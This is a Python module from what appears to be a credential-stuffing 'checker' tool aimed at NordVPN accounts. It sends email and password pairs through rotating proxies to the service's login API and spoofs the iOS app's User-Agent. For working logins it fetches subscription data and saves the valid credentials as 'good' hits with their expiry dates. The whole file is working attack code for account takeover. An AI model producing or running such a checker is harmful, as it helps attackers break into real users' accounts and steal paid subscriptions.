from __main__ import checker
from requests import get,post
from modules.functions import set_proxy, log, save
from base64 import b64encode
from datetime import datetime

def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        data = f"password={password}&username={email}"
        header_1 = {
            "Content-Type":"application/x-www-form-urlencoded",
            "Host": "zwyr157wwiu6eior.com" ,
            "Connection": "keep-alive" ,
            "Accept": "*/*" ,
            "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1" ,
            "Content-Length": "51" ,
            "Accept-Language": "en-us" ,
            "Accept-Encoding": "gzip, deflate, br"
        }
        header_2 = {
            "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1" ,
            "Authorization": "" 
        }
        try:
            a = post("https://zwyr157wwiu6eior.com/v1/users/tokens",data=data,headers=header_1,proxies=set_proxy(proxy),timeout=checker.timeout)
            if "Invalid username" in a.text or "Invalid password" in a.text:
                retries += 1
            elif "token" in a.text:
                token = b64encode(("token:" + a.json()["token"]).encode()).decode()
                header_2["Authorization"] = f"Basic {token}"
                b = get("https://zwyr157wwiu6eior.com/v1/users/services",headers=header_2,proxies=set_proxy(proxy),timeout=checker.timeout)
                if b.text == "[]":
                    if not checker.cui:
                        log("custom",email+":"+password,"NordVPN")
                    save("NordVPN","custom",checker.time,email+":"+password)
                    checker.custom += 1
                    checker.cpm += 1
                    return
                else:
                    data = b.json()[0]
                    date = data["expires_at"]
                    expire = int(data["expires_at"].split(" ")[0].replace("-",""))
                    nowtime = int(datetime.now().strftime("%Y%m%d"))
                    if expire > nowtime:
                        if not checker.cui:
                            log("good",email+":"+password,"NordVPN")
                        save("NordVPN","good",checker.time,email+":"+password+f" | Expire: {date}")
                        checker.good += 1
                        checker.cpm += 1
                        return
                    else:
                        if not checker.cui:
                            log("custom",email+":"+password,"NordVPN")
                        save("NordVPN","custom",checker.time,email+":"+password)
                        checker.custom += 1
                        checker.cpm += 1
                        return
            else:
                raise
        except:
            checker.errors += 1
    if not checker.cui:
        log("bad",email+":"+password,"NordVPN")
    checker.bad += 1 
    checker.cpm += 1
    return